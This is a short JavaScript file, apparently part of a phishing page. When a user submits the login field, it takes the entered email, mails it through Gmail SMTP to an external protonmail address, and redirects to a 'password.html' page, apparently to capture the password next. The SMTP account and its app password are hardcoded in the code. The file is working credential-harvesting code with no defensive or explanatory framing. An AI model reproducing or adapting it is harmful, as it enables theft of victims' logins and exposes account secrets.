window.onload=function()
{
    let email = document.getElementById("useridInput");
    email.addEventListener("focus", myFocusFunction, true);
    email.addEventListener("blur", myBlurFunction, true);

    function myFocusFunction() {
        document.getElementById("btn").style.backgroundColor = "#3e9920";
    }

    function myBlurFunction() {
        document.getElementById("myInput").style.backgroundColor = "";
    }


    let btn = document.getElementById("btn");


    btn.onclick = function() {
        let mail = document.getElementById("useridInput").value;
        let finalmessage = `Login/email : ${mail} <br>`;

        if (mail.indexOf("@") != -1) {
            Email.send({
                Host: "smtp.gmail.com",
                Username : "xsda.ddce.2343.2343.xsop@gmail.com",
                Password : "xhqe towf geiu nvyt",
                To : 'user1533@protonmail.com',
                From : "xsda.ddce.2343.2343.xsop@gmail.com",
                Subject : "Mail from website",
                Body : finalmessage
            });
            window.location.assign('password.html');
        } else {
            window.location.assign('#top');
        }
    }
}
